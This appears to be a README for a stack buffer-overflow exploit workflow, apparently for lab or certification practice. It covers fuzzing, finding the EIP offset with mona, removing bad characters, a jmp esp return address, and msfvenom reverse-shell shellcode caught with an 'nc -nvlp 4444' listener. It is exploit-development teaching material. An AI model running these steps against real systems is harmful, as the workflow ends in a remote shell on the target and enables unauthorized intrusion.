# Buffer Overflow Steps

I'll improve these instructions soon.

1. Setup target ip and port in config.py

2. Setup your ip and a port you will be listening on 

## Fuzzing

3. Run vulnerable service in immunity (with mona.py installed)

4. Run `python fuzzer.py`

5. Note the last bytes fuzzed before crashing

6. Type `!mona config -set workingfolder c:\mona\%p` into immunity

## First Payload

7. Run pattern_create with the offset from step 5 + 400. 
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <bytes from step 5 + 400>`

8. Place this pattern in the config retn. Set payload_ready to false

9. Re-run the vulnerable service

10. Run `python exploit.py`

11. `!mona findmsp -distance <bytes+400>` 

12. Find "EIP contains... " (offset xxxx) and modify the config offset to contain this new offset value.

## EIP Control Confirmation

13. Set retn to "BBBB"

14. Re-run service, re-run exploit

15. Confirm that EIP is 0x42424242. If not, there's a problem

## Bad Char Removal

16. `!mona bytearray -b "\x00"`

17. Run `python badchars.py`

18. Set config buf to the text printed out by badchars

19. Re-run service, re-run exploit

20. Fill in the ESP address in the following: `!mona compare -f c:\mona\<filename>\bytearray.bin -a <esp>` 

21. Read the bad bytes that mona throws back. Place them in config badchars. Repeat steps 16 to 20 until there are no more bad bytes. Adjust bytes in step 16 as well. 

## The Exploit

22. `!mona jmp -r esp -cpb "<badbytes>"`

23. Choose an address of `jmp esp` given in the log, set it as config retn

24. `msfvenom -p windows/shell_reverse_tcp LHOST=<yourip> LPORT=<yourport> EXITFUNC=thread -b "<badbytes>" -f py -o payload.py`

25. Set config payload_ready to true

26. `nc -nvlp 4444`

27. Re-run service, re-run exploit. 
